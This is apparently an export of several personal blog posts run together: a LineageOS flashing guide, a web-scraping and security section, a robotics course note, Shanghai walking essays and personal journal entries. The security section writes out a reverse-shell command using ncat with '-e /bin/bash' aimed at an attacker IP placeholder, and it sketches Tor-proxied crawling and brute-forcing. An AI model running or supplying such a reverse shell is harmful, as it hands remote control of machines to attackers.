My device is called \u201cCamellia,\u201d which is\nkind of stupid. Anyways, I didn\u2019t succeed.</p>\n<p>I bought a Motorola G54 for around 120 USD after hearing that\nMotorola has few bloatwares. However, it turns out that the Motorola G54\nhas plenty of bloatwares and runs its own UI version. The bootloader is\nquite easy to unlock, but sadly LineageOS doesn\u2019t officially support\nthis model, so it\u2019s not much different from my old Android anyways.</p>\n<p>So last time, I gave up.</p>\n<h3\nid=\"the-unsuccessful-and-frustrating-journey-of-exploring-pinephone\">The\nUnsuccessful and Frustrating Journey of Exploring PinePhone</h3>\n<p><a\nhref=\"https://www.jimchen.me/blog/Thu%20Sep%2028%202023%2000:38:25\">https://www.jimchen.me/blog/Thu%20Sep%2028%202023%2000:38:25</a></p>\n<p>Last year, I tried PinePhone after deciding to switch to open source\nsoftware. After that, I became fanatic and obsessed with everything FOSS\nrelated and ArchLinux. Anyway, the PinePhone quickly stopped functioning\nand couldn\u2019t read the MicroSD card. I still haven\u2019t fixed it. Trying\nPinePhone cost me a lot of time.</p>\n<h3 id=\"trying-adb-failed-and-recovering-my-computer\">Trying adb,\nFailed, and Recovering My Computer</h3>\n<p><a\nhref=\"https://www.jimchen.me/blog/Sun%20Sep%2017%202023%2015:29:34\">https://www.jimchen.me/blog/Sun%20Sep%2017%202023%2015:29:34</a></p>\n<p>This is my first attempt, dating as early as mid-September last year.\nThe adb wouldn\u2019t run on Ubuntu for no reason, and after asking ChatGPT,\nit returned a command which I ran and broke my laptop. I tried adb with\nthe Redmi Note 10 the first time, and didn\u2019t successfully unlock it.</p>\n<p>Anyways, looking back at my journey, smartphones were really hard on\nme, unlike the exploration of other tech. Archlinux and LFS didn\u2019t take\nmuch time to set up, and cloud servers are very intuitive to me; I\nunderstood everything in a fairly short time.</p>\n<h2 id=\"how-to-install-lineageos\">How to Install LineageOS</h2>\n<p>So basically, you need an <strong>unlocked</strong> &amp;\n<strong>supported</strong> phone. One can install ArchLinux or Ubuntu on\npractically every laptop device, but mobile is different in terms of\narchitecture.</p>\n<p>Actually, there are no official builds for my old phone (Redmi Note\n10 5G); to be honest, the phone is nothing but a whole piece of\nbloatware trash piled together with built-in spyware and censorship.</p>\n<p>I was lucky to find this post where a Russian developer released\nLineageOS for that model: <a\nhref=\"https://xdaforums.com/t/rom-13-unofficial-camellia-camellian-lineageos-20-0-with-ota-support-updated-28-01-2024.4618399/\">https://xdaforums.com/t/rom-13-unofficial-camellia-camellian-lineageos-20-0-with-ota-support-updated-28-01-2024.4618399/</a></p>\n<p>There are many unofficial releases for those community-driven open\nsource projects.</p>\n<p>I found it surprisingly easy to implement.</p>\n<p>Source: <a href=\"https://m929.ru/\">https://m929.ru/</a></p>\n<p><strong>How to flash ROM:</strong></p>\n<ol type=\"1\">\n<li>Install ROM\u2019s recovery using: fastboot flash boot boot.img</li>\n<li>Boot into recovery In Pixel, adb sideload must be enabled in the\napply update section.</li>\n<li>On your PC with the downloaded ROM, type in the terminal: adb\nsideload ROM.zip</li>\n<li>Flash firmware A13; download from mega.nz</li>\n<li>Wipe data/factory reset</li>\n</ol>\n<p>Like basically, after flashing that and wiping the data, I had a\nworking LineageOS!</p>\n<h2 id=\"many-types-of-phones\">Many Types of Phones</h2>\n<p>I don\u2019t get why there are so many phone manufacturers and so many\nphone brands out there. Moreover, I don\u2019t understand why they need to\nrelease tens of hundreds of phones every year, literally for the sake of\nit. I mean, I don\u2019t really see a difference between those brands, except\nfor different <strong>default</strong> operating systems and UIs, which\nI want to customize myself.</p>\n<p>I think it\u2019s all a commercial joke, this booming market of OS. Today\nI went into a phone reseller store and asked the price, and they said\nthe cheapest is more than 1000 RMB. It\u2019s so crazily expensive compared\nto other things, especially considering it\u2019s a reseller. I mean, I can\nbuy a good-end brand-new phone with 1000 RMB. Then I went into Samsung\nGalaxy and asked them for these models (that Postmarket OS supports):\nSamsung Galaxy A5, Samsung Galaxy E7, Samsung Galaxy S III</p>\n<p>They were kind of surprised in finding I want so freaking old phones,\nand for a moment I couldn\u2019t help but burst out laughing. I mean, it was\njust hilarious.</p>\n<p>I seriously don\u2019t understand the need to buy the newest phones or\nupdate them like three times a year.</p>\n<h2 id=\"why-i-dislike-defaults\">Why I Dislike Defaults</h2>\n<p>I mainly dislike defaults because of a lack of support for personal\ncustomization and their bloatware properties. Still, I am a lazy person,\nand I don\u2019t do extensive Gnome customization or vim scripting. If\nsomething is optional and free, actually chances are I would still like\nto use it. If something is free and proprietary I wouldn\u2019t have anything\nagainst it. But the problem lies in the multiple bugs and closed source\nof the operating systems or software that there\u2019s just no way to fix for\nsomeone not in the company. Sometimes I find a bug I probably want to\ntry to solve on my own. But sometimes with iOS and Google Bugs (like an\napp won\u2019t work), there are just no ways to find the solutions.</p>\n<h2 id=\"realizing-my-journey-these-years\">Realizing My Journey These\nYears</h2>\n<p>Looking back into my teen years, literally, I have shown strong\ndislike for smartphones. I didn\u2019t have a smartphone my entire middle\nschool career, only inheriting one from my dad in the summer of 2020\nwhen I was going to high school. I hated the idea of a smartphone for as\nlong as I could remember. I wasn\u2019t opposed to other tech stuff; like, I\nused a computer long before that and had my own computer in the 6th\ngrade.</p>\n<p>I probably missed adding lots of people to WeChat contacts, looking\nback. Like literally, I was so ignorant of the existence of WeChat and\nso arrogant of the whole concept.</p>\n<p>I can probably say that most of my new preferences today don\u2019t come\nfrom nowhere but are like this for many years, except previously either\nexternally controlled, restricted, or just having some gaps that I\ncouldn\u2019t cross with limited skills.</p>\n<p>I was born different from many people, and I don\u2019t want to judge who\nis better. Different people can have different preferences, none more\nsuperior than the others. Yet, I am hoping to maintain mutual respect\nfor people with different digital philosophies.</p>\n<p>Even after I had a smartphone, I was much against using it. During\nthe summer before I went to university, I limited my smartphone time to\nliterally 10 minutes every day (only scanning the code when entering a\nlibrary and around 5 minutes checking my friends\u2019 status on Weixin),\nalthough once or twice a week I would bypass that, but no more than 1\nhour.</p>\n<p>After I entered university, I decided it was too distracting, and I\ndidn\u2019t use my phone for a whole semester. It was kind of amazing to\nbelieve in retrospect, but I really didn\u2019t use it for an entire three\nmonths at all. I bore the inconvenience and utilized my computer to do\nall sorts of stuff. The second semester I continued my stance against\nusing smartphones, and couldn\u2019t hold on after the COVID pandemic hit. To\nbe honest, if it wasn\u2019t for COVID, I would probably keep on not using a\nsmartphone, only there was mandatory testing to be done every day, which\nis awfully annoying.</p>\n<p>People would usually be confused by my statement of not using\nsmartphones, and few would think from my perspective. I can confidently\nsay that not having a smartphone nowadays is just unbearable in China;\nif you have no WeChat, you can do practically nothing and are no\ndifferent than a dying old person in terms of living conveniences.</p>\n<p>I did that experiment myself and failed. During that time, I\nremembered the maps and bus routes by heart and went out riding my\nbicycle (which I later lost). After losing my bicycle, I walked a lot. I\nwatched many movies and YouTube on my computer; indeed, YouTube was one\nof my main forms of entertainment at that time. I also read a lot, and\nthat was the last period where I remembered myself actually enjoying\nliterature. I can no longer dive into literature. I relied on my parents\nfor much information and kept a daily track of everything to do, every\nsingle day. I frequently climbed to the top of the school building to\nwatch the city lights at night. I believed in all sorts of good things.\nSometimes, I kind of longed for that kind of mentality at the time. It\nwas actually very sad and had a reverse effect on me.</p>\n<p>Also, there was one occasion when my Android phone started beeping\nfor no reason, and then it stopped.</p>\n<h2 id=\"downsides-of-lineageos-and-other-distros\">Downsides of LineageOS\nand Other Distros?</h2>\n<p>So LineageOS doesn\u2019t have a package manager, which I think is\ndefinitely not ideal. But I can use my computer for 90% of tasks.</p>\n<p>The other OS that I\u2019m interested in is PostMarket OS (or mobile\nAlpine). However, it doesn\u2019t seem to support WeChat. That\u2019s frustrating\nfor me because the main reason I use my smartphone is for WeChat. So if\nsomeday, say, I leave Mainland China, then I will probably ditch WeChat\nand start using that distro.</p>\n<p>There is also GrapheneOS, which mainly supports Google Pixel.\nPinePhone has low specs, and I have had great trouble using it.</p>\n<h2 id=\"removing-system-apps-from-lineageos\">Removing System Apps from\nLineageOS</h2>\n<pre class=\"bash\"><code>adb shell pm uninstall -k --user 0 org.lineageos.eleven\nadb shell pm uninstall -k --user 0 org.lineageos.jelly\nadb shell pm uninstall -k --user 0 org.lineageos.etar\nadb shell pm uninstall -k --user 0 org.lineageos.audiofx\nadb shell pm uninstall -k --user 0 org.lineageos.recorder\nadb shell pm uninstall -k --user 0 com.android.calculator2\nadb shell pm uninstall -k --user 0 com.android.fmradio\nadb shell pm uninstall -k --user 0 com.android.stk</code></pre>\n<h2 id=\"setting-up-lineageos\">Setting Up LineageOS</h2>\n<p>Other than that, it\u2019s just a few clicks away with adb install for all\nessential software, and I set up my phone pretty quickly.

Neglecting\ncopyright is a serious issue</p>\n<p>Video content can often be a target for scraping. For example, some\nvideo sites use HTML tags like:\n<code>&lt;video src=\"blob:https://www.youtube.com/34b0564d-9f35-4581-bf5c-eed542280a0b\"&gt;&lt;/video&gt;</code>.\nEven though blob URLs obscure the source, they often load m3u8 or ts\nfiles. An m3u8 file usually consists of many segments of video files\n(they are combined together). It is possible to do so using an HLS\nsniffer. Selenium can also be used to capture the performance logs and\nextract URLs. Please always comply to terms and don\u2019t use steamlink for\nunlawful purposes.</p>\n<h2 id=\"tor-crawling\">Tor Crawling</h2>\n<p>Warning: Be cautious about the Dark Web as it contains disturbing\ncontent. It is not advised to visit the Dark Web, nor use Tor for\nunethical purposes.</p>\n<p>Only use tor crawling when anonymity is a priority and when you\nadhere to platform\u2019s rules. In Selenium, specifically</p>\n<pre class=\"py\"><code>options=Options()\noptions.set_preference(&quot;network.proxy.type&quot;, 1)\noptions.set_preference(&quot;network.proxy.socks&quot;, &quot;127.0.0.1&quot;)\noptions.set_preference(&quot;network.proxy.socks_port&quot;, 9050)\noptions.set_preference(&quot;network.proxy.socks_version&quot;, 5)\noptions.set_preference(&quot;network.proxy.socks_remote_dns&quot;, True)\nbrowser = Firefox(options=options)</code></pre>\n<h2 id=\"understanding-brute-forcing\">Understanding Brute-Forcing</h2>\n<p>Ethical Reminder: This is illegal and unethical. Do not engage in\nbrute-forcing. Instead, focus on strengthening your defenses.</p>\n<p>Always use secure passwords by utilizing KeePass(offline password\nmanager) to generate high entropy passwords. Simple security practice\nmakes you the harder target. It is a great way to stop attackers from\ngaining access(if a weak website leaked the password with a weak hash).\nIt is advised when designing a web server use a difficult captcha when\nusers log in, and utilize Cloudflare for protection. Cloudflare\u2019s\nCaptcha is excellent for individual developers to protext DDOS.</p>\n<p>Attackers might use multiple IPs to attempt brute-forcing passwords\nby sending numerous requests with selenium sendkeys, like\n<code>button=driver.find_element()</code> and\n<code>button.click()</code>. Small websites with weak security are\nusually more targeted.</p>\n<h2 id=\"reverse-shell\">Reverse Shell</h2>\n<p>Always safeguard cloud machines with public ipv4 as they are the\ntargets of many random attacks. On my Linode machine I could see people\ntrying sshd passwords. Don\u2019t delete the root password or use a weak root\npassword!</p>\n<p>Some malicious programs gain access (espeically on Windows exes) to\nthe network! It is important to download from secure sources(like\nofficial ArchLinux packages and inspecting the PKGBUILD). Some malicious\nprograms may gain access to the network to participate in DDOS.</p>\n<p>I tried this experiment with my Linode. I can gain remote access to\nmy Linode machine by using ncat. On the Linode machine\n<code>nohup ncat [attacker's IP] [port] -e /bin/bash &amp;</code> On my\nlaptop listen, after this I gain access to execute bash script on my\nlaptop. Only do this in a controlled environment and adheres to\nlaws!</p>\n<h2 id=\"email-concerns\">Email Concerns</h2>\n<p>Respect the privacy of emails.</p>\n<p>Potential Threats: Attackers might flood a victim\u2019s email by\nsubscribing to mailing lists(designed not to go to spam), causing an\ninundated inbox.</p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>It is important to follow the rules and use official APIs when\ncrawling the website.

But mostly is just C Program, which I am also very bad at. As a\nresult, I faced obstacles and bugs at the start of the course, making me\nweary and sad indeed.</p>\n<p>But mostly it was because I am too stupid, and also I wasn't working\nhard enough.</p>\n<h2 id=\"chatgpt\">ChatGPT</h2>\n<p>Lingua Franca is a new and not so widely-used language, so ChatGPT\nhave limited abilities(unlike C or Python or Javascript), but it is\nstill very good in generating code. The only difference is that you have\nto manually debug with GPT's generation.</p>\n<h2 id=\"printf\">Printf</h2>\n<p>So basically I had a really hard time making the printf statements in\nLingua Franca work. At the end it turned out everything was fine except\nthat the manuel wan't clear and the TA had limited experience.</p>\n<p>So basically connect and make it bootsel mode (RP1-RP2 appearing in\nthe media) and run</p>\n<pre class=\"sh\"><code>lfc src/[program].lf &amp;&amp; picotool load -x bin/[program].elf -f\nsudo screen /dev/ttyACM0 115200</code></pre>\n<p>The problem was I couldn't find the ttyACM when connected, and it was\nbecause I hadn't used picotool to load the program into the robot.

Physical Time: Physical time in LF is used when the\nmodel needs to interact with the physical world or external components\nthat operate in real-time.</p>\n<p>Also, their types are different, and not specifying the right type,\nlike ld vs lld can cause problems.

Located in the north of the Pudong district,\nGreen City is the biggest international community in Shanghai and an\nideal place to live in.</p>\n<p>Being one of the richest communities in Shanghai, Green City is known\nfor its low density of people and high quality of life.</p>\n<p><img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/284822461-9c5e632e-217f-4cf9-a8d0-2970c904cbb6.png\"\nalt=\"image\" /><br />\n</p>\n<p>I live in Zhangjiang High-tech Park so I usually go there from\nYunshan Road. On the way between Longdong Avenue and Jinxiu Road, there\nis a small river, some luxurious houses, and a park in construction.\nThere are no people and cars, yet the trees are in good order. I could\nsee far on that road and there aren\u2019t any tall buildings along the way.\nThe roads are neat and organized. Everything is still. There are no\ninterfering roads in two kilometers.</p>\n<p>When I got on the bridge that crossed the river I saw the moon\nshining brightly in the sky. I could clearly see the paths along with\nthe river and feel the calmness of the river. Its surface is smooth and\ntakes in everything from above. The tall trees on two sides of the river\nand the streetlight that shows the way are in reflection. That is a time\nwhen I feel true to myself and free again, away from boundaries and\npressure in my daily life.</p>\n<figure>\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/284822474-bf6b4130-4f60-4053-a9f8-d6a12b3f88c9.png\"\nalt=\"image\" />\n<figcaption aria-hidden=\"true\">image</figcaption>\n</figure>\n<p>It usually takes 40 minutes to walk to Jinxiu Road and another 15\nminutes to arrive at Biyun Road. There is a shopping center where I can\nbuy a bottle of water in Carrefour or eat dinner.</p>\n<p>They were constructing in later parts of Yunshan Road. They were\nbuilding line 18. I do not know when it will be finished. I hope it\nwould be finished sooner for I was counting on it to go to Yangpu\ndistrict a lot quicker that way. But I may not be in Shanghai by the\ntime it is finished.</p>\n<figure>\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/1d79ab03-f7a6-4ebe-8988-203f000f977c\"\nalt=\"image\" />\n<figcaption aria-hidden=\"true\">image</figcaption>\n</figure>\n<p>Green City is great for sport, too. There is a Decathlon and a\nstadium east of the shopping mall. Besides the stadium, there are also\nlots of restaurants. I remember Italian and American restaurants selling\ntheir local food. The food seems strange to me and as I am not\ninterested in eating as much as I am interested in walking, I usually\neat a simple meal at the shopping center.</p>\n<p>There is a swimming pool and as I walked through the stadium I could\nclearly see it. On my right side, there is a soccer field. I walked past\nand came to Lantian Road. The subway station is on Yanggao Road, about\n300 meters from me. I turned right and there is a park. The park looks\nsmall but it is long and really beautiful.</p>\n<figure>\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/8e837dfd-5f66-4365-84dd-a1654fb562dc\"\nalt=\"image\" />\n<figcaption aria-hidden=\"true\">image</figcaption>\n</figure>\n<p>If you walk along Biyun Road to Hongfeng Street and keep walking, you\nmay find a path leading into a small river. There is an art museum along\nthe river. The museum is designed for ancient Chinese clothing and a\nwoman takes a picture of you on a seat if you want. The picture is taken\nand sent for free. The food and drinks in that art museum are really\nexpensive. There is a library in the museum.</p>\n<p>Keep on to the path on the side of the river and there is an office\npark. I entered it from small paths leading up from the river. There is\na pond inside it and there are many companies. The environment inside is\nreally good.</p>\n<figure>\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/0ac8e9ab-4bc5-4d23-a89b-9cd2d4e5ba60\"\nalt=\"image\" />\n<figcaption aria-hidden=\"true\">image</figcaption>\n</figure>\n<p>On the intersection of Hongfeng Road and MingYue Road, there are two\nmarkets, one big and one small. From there you can buy a lot of exported\nthings. There is a bakery inside the big market called City Shop. There\nare different types of milk from Australia, America, and all over the\nworld in City Shop. There are also different types of snacks-chocolates,\nbiscuits-with no Chinese written on them. I usually come alone and don\u2019t\nhave much money or space in my bag for these things, so I usually just\nbuy water to drink.</p>\n<p>There are bars and restaurants along Hongfeng Road. But it is far\nfrom the restaurants in the city center. They are just small restaurants\nand are much quieter.</p>\n<p>I see lots of foreigners talking in bars and restaurants, people with\nwhite hair and mustache, young men with blonde hair, laughing and\ndrinking. None of them are too noisy. The restaurants are not crowded\nbut rather comfortable.<br />\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/60555d79-8f8a-4a44-a692-69fd5020a6c5\"\nalt=\"image\" /></p>\n<p>Then it was usually time for me to return home. As I went through the\ngardens and villas, I couldn\u2019t help but admire them. On Mingyue Road the\nroads are well-built and trees grow on both sides of the street. It is\nalways pleasant to walk between tall trees. On the smaller roads, there\nare chairs, and sitting there, I could see the schools and houses on\neither way of the street. There were some people coming and I saw that a\nfather riding bike with his son and telling him not to be naughty. I saw\nan elder woman returning home from shopping.</p>\n<figure>\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/a32fc141-e80e-45c2-8545-6d0adaf0ce98\"\nalt=\"image\" />\n<figcaption aria-hidden=\"true\">image</figcaption>\n</figure>\n<p>I wanted to remain there all day. There is so much to see. What\nimpressed me is the beauty of life. Green City is the best neighborhood\nin Shanghai, but everything is so expensive. It is not only a green and\nbeautiful place but also a part where the culture is diverse, and life\ncan be peaceful and enjoyable.</p>\n", "_id": "66689635547d3fe09811876a"}

One can always find shelter and water on the way. There\nare two sides of Huangpu River, so there are two routes to go.</p>\n<p>When I lived in Zhongxing Road two years ago I always went walking on\nthe Puxi side of the route. My home was about 3 to 4 kilometers from the\nGarden Bridge on Suzhou Creek, but it often took me an hour to get\nthere. The reason is that Puxi is crowded and there are so many\nmotorcycles around. There are too many small roads and I always had to\nwait for the light to turn green.</p>\n<figure>\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/8f80fc34-dfa3-4c2c-a379-dc94e12aee7b\"\nstyle=\"width:80.0%\" alt=\"image\" />\n<figcaption aria-hidden=\"true\">image</figcaption>\n</figure>\n<p>Garden Bridge</p>\n<p>When I lived in my previous home I had been to almost everywhere\naround. There is not a street I did not know in a distance less than 5\nkilometers from my home. I found, among those dirty streets, that the\nriverside Promenade is the best place to go for walking.</p>\n<p>On the weekends I would go walking south of Garden Bridge. Sometimes\nit is crowded there, especially when there is a festival. So many people\nwere there that I couldn\u2019t find a seat to enjoy the view. But that is\nabout the only place crowded. Walk southwards and gradually it becomes\nquieter. Go further south, about 4 kilometers and there are few people\nin sight. Then I would see Nanpu Bridge. As I was always tired when\narriving at Nanpu Bridge, I would take line 4 home.</p>\n<p>Sometimes on Sunday afternoon, I went to cram classes in Xueersi. The\nplace is on Dalian Road. Since it starts at 3 pm I would go out at 10 in\nthe morning and have a walk. First I would walk to Garden Bridge. Then I\nwould turn northward. If you walk northward of Garden Bridge there is\nhalf a kilometer where you cannot see Huangpu River since the route\nalong the river is under construction. There is a hotel along the way\nwhich is very expensive and beautiful, where I usually took a rest\ninside. Then after walking half a kilometer I came to a park. Near the\npark is a subway station: International Cruise Terminal, line 12. The\npark is very beautiful. People are playing some game involving jumping\nand swinging inside, but that I took no interest in. There are those\nglasses, on which you can see the history of the International Cruise\nTerminal, including some famous people. The glass is transparent and I\nsaw the tallest buildings in Pudong through them. At night I also saw\nthe building behind me reflected, and it looks like it\u2019s in the air in\nPudong. Anyway, that is really funny.</p>\n<p><img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/54aaa521-812b-4463-86aa-bd1182df020b\"\nstyle=\"width:80.0%\" alt=\"image\" /> <img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/1dc5251a-1a3e-42b0-b653-2cfdd46db86b\"\nstyle=\"width:80.0%\" alt=\"image\" /></p>\n<p>The Park in the North of The Bund</p>\n<p>Walking further northward (or maybe to the east) along Huangpu River,\nI came to the Qinhuangdao ferry. I walked out to the intersection of\nDalian Road and Yangshupu Road. Line 4 is there and I went the rest of\nthe way to Xueersi by subway.</p>\n<p>Northward of Qinhuangdao Ferry is Yangpu District. When I first went\nthere it was under construction and very deserted. But after a year,\nwhen I was in ninth grade, I found it good to walk after the road along\nthe river was finished. Old people come here to see the history of the\nindustry of Shanghai. Young people go there for fashion, as there are\nsome clothing shops. There are lots of children\u2019s playgrounds and\nslides, swings. Little children jumped all over laughing with their\nparents, who escort them there. I came here because I needed to take a\nrest from studying and I was just too bored.</p>\n<figure>\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/5e05528a-915b-43d1-993b-579eaf6ee7cb\"\nstyle=\"width:80.0%\" alt=\"image\" />\n<figcaption aria-hidden=\"true\">image</figcaption>\n</figure>\n<p>Under Yangpu Bridge</p>\n<p>There are many places to eat like Burger King, Macdonald on the\nway.</p>\n<p>Walk another 6 kilometers and you come to Fuxing Island.

You can see the beautiful\nscenery more closely. It is always joyous to walk in the sunshine. It is\nalso safer for you won\u2019t get lost or trip over something too dark to\nsee. But night has its own charms. Andrew Webber said, \u201cnighttime\nsharpens, heightens each sensation.\u201d Though this is a song in an opera,\nit is proved. When you walk along the river at night, everything is more\nstill. In the daytime there are many things to observe, there are just\ntoo much light and sound, filling your ears and eyes. In the night there\nare no more lights than distant street lamps, no more sound to hear, and\none\u2019s ears gave way to a lot of different, interesting sounds. There is\nmuch more to be discovered along the river.</p>\n<p>I used to have a hard time walking around Zhongxing Road. It was so\nhard to be alone, there are people everywhere. The street is full of\nmotorcycles even at 10 or 11 pm.</p>\n<p>Now I live in Zhangjiang High Technology park, and I always walk to\nthe suburban if I go wandering around. It was deserted even at 9 pm.\nThere are few buses and taxis, and stores are shut down. It is so hard\nto get back. I couldn\u2019t walk to wherever I want because there are\nchances I couldn\u2019t get back quickly. There are few lights and people in\nthe streets at night.</p>\n<p>I like always like wandering around just for fun. It is one of my\nhobbies now. Sometimes I want to be like Strider, but there is a big\ndifference between what you want to do for fun and your occupation.

As I am always\nenergetic and had been to lots of interesting places, I\u2019d like to share\nwith you some of my experiences.</p>\n<p>One thing I like about Pudong is that it is much quieter and less\ncrowded than the city center. There are fewer people and cars in Pudong\nand more trees, so the environment is better and it is a better place\nfor walking.</p>\n<p>In eighth grade, I decided I hate the noise in the city center. (for\nat that time I lived near Zhongxing Road) I wanted to find a quiet place\nwhere I could be myself. I used to go alone on subways to the terminal\nstation. There were not many people in the countryside, but it was\nalways deserted there. Sometimes so bare and bleak that it seemed like I\nam the only person in kilometers.</p>\n<p>It is not really great near Yuandong Avenue Station, for you can\u2019t\nget any water to drink and may face the danger of being attacked by wild\ndogs in villages. This picture is near that station.</p>\n<p>Some of these places are ok during the daytime, though in some places\nthere are trucks, like the place near Line 5 Xidu station. All I could\nsmell was smoke and gas when they speed past.</p>\n<p>But these places are bad to go to at nighttime. When I was walking on\nJinke road and came to Shanghai Aircraft Design and Research Institute\n(down Huaxia Road), I thought about turning left for I didn\u2019t know about\nthat place. It felt scary and ghostly. There are two fields that look\nlike farmland, except that the grass in it is as tall as man, with\nnothing that looks like a building in sight. There were the calls of\ninsects in there. There were no cars, except for a few people learning\ncars who are driving slowly around. But the roads are unbuilt and I had\nto go back and forth to find my way, always turning back. The roads end\nsuddenly and it looks unfinished. At some point, I tried to see what was\nbeyond a road that ends in the middle when a man came out of a house and\nasked what I was doing. It scared me because it was dark there. I was\ntaken aback and hurriedly got away. After that, I think that place is\nhaunted.</p>\n<p>In other places, like the Shendu highway in the south of Pudong,\nthere are farms and fruits there. I saw grapes and peaches. They grow in\ngreenhouses. There are even farmers there.</p>\n<p>If you still can\u2019t get a vivid picture of the countryside from my\ndescription, well just go see for it yourself and you\u2019ll see what I\nmean.</p>\n<p>I am just a restless boy eager to travel far away and always\nwandering around for no clear reason. I decided that it is normal, but I\nfound few people like me.</p>\n<p>These days the typhoon is really annoying me as I have to stay at\nhome. But I must also count myself lucky since so many people are\nworking these days just to maintain our daily life and ensure our\nsafety. Anyway, I hope all will be back to normal soon.</p>\n", "_id": "66689636547d3fe09811876d"}
{"title": "Navigating My Contradictory Behavior", "date": "Tue Jun 11 2024 21:15:16", "type": "journal", "body": "<h2 id=\"anecdotal-introduction\">Anecdotal Introduction</h2>\n<p>So these days I got increasingly aware of a behavior I have. For\nexample, I would watch some videos on YouTube, I often see debates like,\n\u201cPeople need to accept others being fat\u201d versus \u201cObese models shouldn\u2019t\nappear in magazines because they are unhealthy.\u201d I find myself reacting\nto the controversial topic of fatphobia I was like \u201cPeople can weigh\nwhatever they want as long as they don\u2019t bother others\u201d</p>\n<p>However, internally, I had a very strict regimen for myself. When my\nBMI got above 23 I was very anxious and put in a lot of effort to\nmaintain fitness, even though 23 BMI is very much within the normal\nrange. Put me into other people\u2019s shoes, for example, imagine my BMI\ngoing above 30, and I would think it is a tremendous issue, and take in\nlarge efforts consistently throughout a long period to address this and\ntry to be fit again, and make big sacrifices.</p>\n<p>Externally, I couldn\u2019t acknowledge this feeling, because I already\nhave this strong internal drive, and addressing it more would put me\nunder unbearable pressure while having a laid-back and relaxed, flexible\nattitude outwards balance this approach. I really admire those fitness\nmodels and athletes and if I keep empathizing with this I would be drawn\nto the pressure to be like them, while I think I should maintain a\nreasonable approach to fitness since I am not working as a fitness\nmodel.</p>\n<h2 id=\"other-unconscious-rants\">Other Unconscious Rants</h2>\n<p>I would always rant about other stuff, like \u201clearning English is not\nimportant\u201d, or \u201cit is useless to have a high TOEFL score, while I was\nvery anxious and had strict standards for myself. Two years ago I got\n109 on TOEFL, and I thought this was a satisfactory score, while\nwatching other high achievers still made me jealous. People were\nlike\u201dGetting 110 out of 120 was a minimum.\u201d I did all I could practicing\nfor a long time. As an ESL person, I always immerse myself in English\ncontent and watch YouTube for around 2 hours a day to maintain my\nEnglish fluency. While I struggle with eloquent public speaking, I\nbelieve my English skills are generally adequate and there are more\nimportant things in life to utilize my time on. So to outside people, I\nwas like, \u201cYou don\u2019t need to study TOEFL\u201d meaing \u201cYou don\u2019t need to\npressure yourself to get a perfect score because there are more\nimportant things in life.\u201d</p>\n<p>Put me in a person who influent in English, and I would panic right\naway and start putting in tremendous effort, even drastic measures to\nimprove my English skills, until to a relatively satisfactory level.</p>\n<p>Also back then I heard good things about cloud computing, so\ninternally I had this great urge to be proficient in cloud computing and\nfluency, and I thought this was such an important skill. I dived into it\nquickly and spent hours and many sleepless nights in different cloud\nplatforms like AWS, Cloudflare, Linode, and learning a lot of cloud\ntechnologies. Externally I was like, \u201cYou don\u2019t need to know about the\ncloud. It is quite unnecessary and relying on GUIs is enough.\u201d I placed\nan extremely high value on modern-day different technologies, but I was\nlike \u201cIt\u2019s better to spend time on a vacation.\u201d</p>\n<h2 id=\"seem-like-advocates-but-not\">Seem Like Advocates but not</h2>\n<p>I don\u2019t know what I mean when I was saying these rants, they just\nseem to come out from nowhere.

When someone is\nhighlighting as issue in a speech, externally I would appear annoyed and\nnot listening carefully. Poor performing students would also appear\nannoyed and not engaged.</p>\n<p>However, this is more of a coping method. Internally, I was always\nthinking about what I should be doing and how to achieve my goals, and\nwhether they were beneficial to me or how much effort I could put into\nthem.</p>\n<p>In fact, I made a monumental effort to stop my gaming addiction and\nsucceeded. Now I document every detail of my gaming, and completely get\nrid of the addiction to focus on more important things. I don\u2019t think\nthis is achievable by most poor performing students.

My parents are dictating over my life, like,\nseriously.</p>\n<p>I mean, I was like already 19 years old, and my parents are still\ntrying to make me the prototype the want me to be, it is extremely\nannoying.</p>\n<p>My parents are putting immense pressure on me, not only on studying,\nbut on all aspects of my life. I need to be \u201cnot fat\u201d, \u201csleeping\nregularly\u201d, \u201cable to adapt to dorm life(where everybody sleeps\nirregularly)\u201d, \u201cexercising regularly\u201d, \u201ceating regularly and properly\u201d,\n\u201cnot gaming\u201d, \u201cbeing extroverted\u201d, \u201cbe extremely good in tech\u201d, \u201cbe\nextremely good in school(which sucks)\u201d, \u201cnot exercise TOO much\u201d.

Also, the occasionally threatens to stop giving me\nmoney.</p>\n<p>Not just to say I am already under immense pressure and feel no urge\nto consent, but their standards is just impossible to achieve for me,\nand honestly, I am trying hard enough.</p>\n<p>Well, my last time getting back to gaming was entirely their fault,\nwhen they pushed me into doing things I didn\u2019t want to. I was depressed\nand there wasn\u2019t anything I could do for mental health except gaming\nagain, which lasts 3 months time before I was coming out of the gaming\nagain. They are causing reverse effects, not doing positive for me. The\nmore they are pushing, the more I don\u2019t comply.</p>\n<p>My parents don\u2019t care about my mental health and it was all of them,\nand they are being very inconsiderate.</p>\n<p>As a grown adult I care for myself and I don\u2019t need anyone telling me\n\u201cI am good\u201d, or \u201cI am bad\u201d, or \u201cI need to change\u201d. As long as I am not\nagainst the law and I don\u2019t bother someone else, I am good the way I\nam.</p>\n<p>Also my parents are very transphobic and homophobic.(though\nirrelevant)</p>\n<p>They are going to the pass the threshold, and I feel not comfortable,\nand they NEED to stop.</p>\n<p>Well, for one thing, I first need to go economically independent, or\nelse I will forever be a slave. How can you argue for anything when you\nrely on someone\u2019s money?</p>\n<p>But just to tell you how annoyed I feel, ahh. Like every aspect of my\nlife is watched by someone. They should mind their own business. Are\npeople honestly getting annoying and wanting to affect others when they\nreach 50 years old?</p>\n<p>I felt traumatized freshman year and my parents at that time was\nreluctant to let me live outside school. I had sleeping problems every\nnight and there wasn\u2019t anything I could do except make intensify the\nconflict the solve the problem. I didn\u2019t talk one word all year with my\nroommates, and it felt extremely annoying to be living with them, ahh. I\ndidn\u2019t have any rights. 